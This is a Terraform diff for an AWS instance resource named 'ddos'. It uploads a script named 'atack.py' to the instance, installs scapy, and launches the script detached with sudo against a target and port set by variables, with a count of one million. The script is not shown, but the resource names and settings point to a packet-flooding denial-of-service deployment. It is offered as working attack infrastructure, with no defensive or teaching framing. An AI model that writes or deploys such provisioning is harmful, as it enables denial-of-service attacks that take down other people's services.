@@ -56,9 +56,10 @@ resource "aws_instance" "ddos" {
   instance_type          = "t2.micro"
   vpc_security_group_ids = ["${aws_security_group.webSG.id}"]
   key_name               = aws_key_pair.kozak.key_name
+
   provisioner "file" {
-    source      = "${abspath(path.root)}/script.sh"
-    destination = "/tmp/script.sh"
+    source      = "${abspath(path.root)}/atack.py"
+    destination = "/tmp/atack.py"
   }
   connection {
     type        = "ssh"
@@ -68,8 +69,10 @@ resource "aws_instance" "ddos" {
   }
   provisioner "remote-exec" {
     inline = [
-      "chmod +x /tmp/script.sh",
-      "sudo bash /tmp/script.sh &",
+        "set -o errexit",
+        "sudo apt update",
+        "sudo apt install python3-scapy -y",
+        "screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 1000000",
     ]
   }
 }
